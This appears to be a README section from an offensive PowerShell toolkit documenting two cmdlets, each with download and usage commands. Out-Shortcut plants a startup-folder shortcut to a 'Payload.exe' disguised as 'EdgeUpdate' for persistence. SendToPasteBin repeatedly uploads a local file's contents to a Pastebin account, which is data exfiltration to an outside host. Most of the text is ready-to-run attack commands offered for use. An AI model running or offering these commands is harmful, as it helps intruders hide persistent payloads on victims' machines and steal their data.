## Out-shortcut.ps1
   
|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|Out-shortcut|Creates an shortcut file that accepts cmdline arguments to execute|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/Out-Shortcut.png)|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/Out-shortcut.ps1" -OutFile "Out-shortcut.ps1"
```

**execute:**
```powershell
#Create shortcut pointing to '$Env:TMP\Payload.exe' on startup folder with 'EdgeUpdate' description
.\Out-Shortcut.ps1 -shortcut "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -target "$Env:TMP\Payload.exe" -description "EdgeUpdate"
```   

<br />

## SendToPasteBin.ps1
   
|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|SendToPasteBin|Get filepath contents and paste it to pastebin.|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/SendToPasteBin.png)|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/SendToPasteBin.ps1" -OutFile "SendToPasteBin.ps1"
```

**prerequisites:**
```
-filepath 'string' only accepts .ps1 .bat .vbs file formats
-payloadurl 'string' only accepts .ps1 .bat .vbs file formats
```

**execute:**
```powershell
Get-Help .\SendToPasteBin.ps1 -full

#Get the contents of -filepath 'string' and creates a new pastebin paste from it on the sellected pastebin account.
.\SendToPasteBin.ps1 -FilePath "test.log" -maxpastes "1" -timeout "2" -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword"

#Get the contents of -filepath 'string' and creates a new pastebin paste from it each 120 seconds a max of 10 pastes on the sellected pastebin account.
.\SendToPasteBin.ps1 -FilePath "test.log" -maxpastes "10" -timeout "120" -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword"
```   
